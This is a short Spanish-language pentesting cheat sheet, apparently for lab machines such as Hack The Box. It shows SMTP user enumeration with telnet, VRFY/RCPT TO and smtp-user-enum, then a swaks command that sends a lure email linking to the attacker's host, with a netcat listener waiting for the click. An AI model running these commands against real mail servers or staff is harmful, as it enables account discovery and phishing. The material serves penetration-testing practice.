

### ENUMERACIÓN DE USUARIOS.
```shell
#NOS CONECTAMOS
telnet 10.10.10.77 25

#PASO OBLIGATORIO
HELO test@test.test

#VERIFICACIÓN DE CORREOS.
VRFY nico@megabank.com #UTILIZANDO VRFY


MAIL FROM: <gorka@megabank.com>
RCPT TO: <nico@megabank.com> #DESPUÉS NOS DEVERIA DE PONER SI EXISTE.

#AUTOMÁTICA ... igual hay que agregar el @... después de cada uno.
smtp-user-enum -M RCPT -U users.txt -t 10.10.10.77
```


### ENVIAR CORREOS
```shell
swaks --to itsupport@outdated.htb --from randomuser@random.com --body "http://10.10.16.5/" --header "Subject: Internal web app"
<-  250 Queued (10.438 seconds) # SI SALE ESTE MENSAJE QUIERE DEDCIR QUE HA LLEGADO.

#LISTENER
nc -nlvp 80
```




